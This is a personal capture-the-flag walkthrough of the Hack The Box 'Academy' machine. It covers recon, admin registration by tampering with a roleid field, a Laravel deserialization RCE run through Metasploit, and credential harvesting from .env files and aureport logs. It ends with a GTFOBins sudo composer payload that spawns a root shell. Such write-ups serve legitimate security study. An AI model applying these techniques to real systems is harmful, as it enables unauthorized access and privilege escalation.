1, recon
ports scan: 
	22/tcp ssh
	80/tcp http `redirect to http://academy.htb/`
	3306/tcp mysql
page check
	From original `index.php`, we only get the `/login.php`and `register.php`
	When we login with a normal account, there would nothing useful for us, but `/admin` is existed.
web-contents enumerate
	By using fuff to enumerate the existed url, there is nothing useful for us.And we check the sub-domains, there is nothing for us.

Let's check the sql-injection:
	In this place, we could not find any error sentences or output, so we could not know is there any sql injection.

This time we gonna try to use burp to catch the package of response.
The submitted information is very funny
`uid=wither&password=1234567&confirm=1234567&roleid=0`
If we change the roleid to 1, we can create a admin account for us.
![](images/Pasted%20image%2020240903090732.png)

In this place we get another sub-domain `dev-staging-01.academy.htb`

We get into a debug or developer platform, and we can get so much source codes and credits.

```
|DB_CONNECTION|"mysql"|
|DB_HOST|"127.0.0.1"|
|DB_PORT|"3306"|
|DB_DATABASE|"homestead"|
|DB_USERNAME|"homestead"|
|DB_PASSWORD|"secret"|
```

I guess `secret` would be the password for user `homestead`.Sadly, it does not.
Come to the error message 
`The stream or file "/var/www/html/htb-academy-dev-01/storage/logs/laravel.log" could not be opened in append mode: failed to open stream: Permission denied`

The various logs above suggest this is running the Laravel PHP framework.

This service is `Laravel PHP framework` , let's check the vulnerability of that.
`PHP Laravel Framework 5.5.40 / 5.6.x < 5.6.30 - token Unserialize Remote Command Execution`
![](images/Pasted%20image%2020240903091836.png)

Then we just need to use MSF to get the `www-data` shell.

Let's enumerate the configs and secret files.
There is a useful file `/var/www/html/academy/.env`
```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!
```
We get the database credits and let us enumerate it, but we cannot check the database
`ERROR 1045 (28000): Access denied for user 'dev'@'localhost' (using password: YES)`
So let's check the `/etc/passwd` and find useful users.
```
21y4d:x:1003:1003::/home/21y4d:/bin/sh
ch4p:x:1004:1004::/home/ch4p:/bin/sh
g0blin:x:1005:1005::/home/g0blin:/bin/sh
mrb3n:x:1001:1001::/home/mrb3n:/bin/sh
cry0l1t3:x:1002:1002::/home/cry0l1t3:/bin/sh
egre55:x:1000:1000:egre55:/home/egre55:/bin/bash
```
By checking their directory, only user `cry0l1t3` is valid and luckily we can use the previous password to login.

In user `egre55` directory, there is a funny file
`.sudo_as_admin_successful`
and user `mrb3n` would also useful because of 
![Pasted image 20240903090732.png](Pasted image 20240903090732.png)

When I check id 
`uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)`
We found adm
`According to the docs, this group:`
```
Group adm is used for system monitoring tasks. Members of this group can read many log files in /var/log, and can use xconsole. Historically, /var/log was /usr/adm (and later /var/adm), thus the name of the group.
```

After a bit of time running different grep commands across all the log data, I came across aureport, a tool that will parse the audit logs for various things. This page suggests the the --tty option can show plaintext passwords. I gave it a try, and it dumped mrb3n’s password on line 2:
```
1. 08/12/2020 02:28:10 83 0 ? 1 sh "su mrb3n",<nl>
2. 08/12/2020 02:28:13 84 0 ? 1 su "mrb3n_Ac@d3my!",<nl>
```

This would be the password of user `mrb3n`
When we check `sudo -l`, finally we find something 
```
Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
```

There would be a tricky thing: we can find the hints from GTFOBins
```
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
sudo composer --working-dir=$TF run-script x
```
